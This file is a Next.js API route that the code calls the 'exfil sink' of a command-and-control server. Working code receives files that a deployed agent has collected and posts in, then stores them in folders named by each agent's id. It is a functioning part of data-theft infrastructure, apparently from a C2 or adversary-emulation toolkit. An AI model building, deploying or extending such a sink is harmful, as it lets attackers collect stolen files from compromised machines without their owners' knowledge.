import { NextRequest, NextResponse } from "next/server";
import { mkdir, writeFile } from "fs/promises";
import path from "path";
import { env } from "~/config/env";

/**
 * Exfil sink. The agent POSTs collected files here as multipart form data;
 * without it the agent's upload path errors out.
 */
const EXFIL_DIR = env.C2_EXFIL_DIR || path.join(process.cwd(), "exfil");

export async function POST(request: NextRequest) {
  try {
    const form = await request.formData();
    const paw = (request.headers.get("X-Request-Id") ?? "unknown").replace(
      /[^a-zA-Z0-9_-]/g,
      ""
    );
    const target = path.join(EXFIL_DIR, paw || "unknown");
    await mkdir(target, { recursive: true });

    let saved = 0;
    for (const [, value] of form.entries()) {
      if (typeof value === "string" || !("arrayBuffer" in value)) continue;
      const filename = path.basename(value.name || `upload-${Date.now()}`);
      await writeFile(
        path.join(target, filename),
        Buffer.from(await value.arrayBuffer())
      );
      saved += 1;
    }

    return NextResponse.json({ saved });
  } catch (error) {
    // eslint-disable-next-line no-console
    console.error("[c2] exfil upload failed:", error);
    return new NextResponse("upload failed", { status: 500 });
  }
}
